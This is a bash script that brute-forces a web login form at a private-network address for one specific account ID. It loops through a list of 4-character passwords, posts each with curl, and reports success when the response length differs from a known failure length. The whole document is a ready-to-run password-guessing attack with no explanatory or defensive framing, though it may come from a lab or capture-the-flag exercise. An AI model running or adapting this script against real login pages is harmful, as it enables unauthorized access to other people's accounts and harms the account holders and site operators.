#!/bin/bash

TARGET_URL="http://10.0.1.209/login.php"
ACCOUNT_ID="1192946126"
PASSWORD_LIST="passwords_4char.txt"

echo "Starting 4-character brute-force for Account ID: $ACCOUNT_ID"

FAILURE_LENGTH=5226 

while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do

    POST_DATA="username=$ACCOUNT_ID&password=$PASSWORD"
    
    RESULT=$(curl -s -X POST -d "$POST_DATA" -w "%{http_code}:%{size_download}\n" -o /dev/null "$TARGET_URL")
    STATUS_CODE=$(echo $RESULT | cut -d: -f1)
    LENGTH=$(echo $RESULT | cut -d: -f2)

    if [ "$LENGTH" -ne "$FAILURE_LENGTH" ]; then
        echo "------------------------------------------------------"
        echo "SUCCESS FOUND!"
        echo "  - Password: $PASSWORD"
        echo "  - Status: $STATUS_CODE"
        echo "  - Length: $LENGTH"
        echo "------------------------------------------------------"
        exit 0
    fi
    
done < "$PASSWORD_LIST"

echo "Brute-force finished. Password not found in the list (4-char lowercase only)."
